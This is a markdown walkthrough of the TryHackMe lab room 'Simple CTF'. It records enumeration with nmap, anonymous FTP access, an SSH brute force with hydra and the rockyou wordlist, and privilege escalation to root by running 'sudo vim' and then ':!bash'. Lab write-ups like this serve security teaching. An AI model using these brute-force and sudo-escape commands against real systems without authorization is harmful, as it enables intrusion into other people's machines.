# 🛡️ TryHackMe Walkthrough — Simple CTF

## 🏷️ Tags  
#tryhackme #ctf #linux #ssh #ftp #hydra #privilege-escalation #sudo #vim #sqli

---

## 🧠 Room Overview  
- **Room name:** Simple CTF  
- **Difficulty:** Easy / Beginner  
- **Date:** 2025-07-19  
- **Objective:** Capture user and root flags through enumeration, exploitation, and privilege escalation.

---

## 🌐 Host Setup

- Added to `/etc/hosts`:
```

10.10.73.112 simplectf.thm

````

- Host responded to ping.

---

## 🔍 Enumeration

### 🔎 Nmap Scan

```bash
nmap -sC -sV -p- simplectf.thm
````

**Open Ports:**

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 21   | FTP     | vsFTPd 3.0.3  |
| 80   | HTTP    | Apache 2.4    |
| 2222 | SSH     | OpenSSH 7.2p2 |

---

### 📂 FTP Enumeration

```bash
ftp simplectf.thm
# login: anonymous
```

* Found `/pub/ForMitch.txt`:

  > "Dammit man... you're the worst dev I've seen. You set the same pass for the system user, and the password is so weak... I cracked it in seconds. Gosh... what a mess!"

📝 Suggests weak password for user `mitch`.

---

### 🔓 SSH Brute Force

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 simplectf.thm ssh
```

→ Valid credentials found (redacted)

---

## 💻 User Access

```bash
ssh mitch@simplectf.thm -p 2222
```

✅ Login successful.

```bash
ls /home
# mitch, sunbath
```

🚫 Cannot access `/home/sunbath` without privilege.

---

## 🚀 Privilege Escalation

### 🔎 Sudo Check

```bash
sudo -l
```

```plaintext
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

### 🧨 Exploit: vim → bash

1. Launch vim with sudo:

   ```bash
   sudo vim
   ```

2. Inside vim:

   ```
   :!bash
   ```

3. Shell as root opened ✅

---

## 🚩 Flags

### 🧑‍💻 User Flag

```bash
cat user.txt
# → <REDACTED>
```

### 👑 Root Flag

```bash
cat /root/root.txt
# → <REDACTED>
```

---

## ⚠️ Vulnerability Info

* `Weak password` for user `mitch`
* `Misconfigured sudo` allowing root via `vim`
* Also referenced:
  `CVE-2019-9053` (SQL injection in CMS Made Simple) — not required in this box

---

## 📚 Summary

* Gained access via **weak FTP hint** + brute-forced SSH.
* Escalated to root via **vim GTFOBin**.
* Reinforces fundamentals: enumeration, bruteforce, and sudo abuse.

---

## 📂 Tags

\#simplectf #tryhackme #linux #ssh #ftp #hydra #sudo #vim #privilege-escalation #cve #sqli


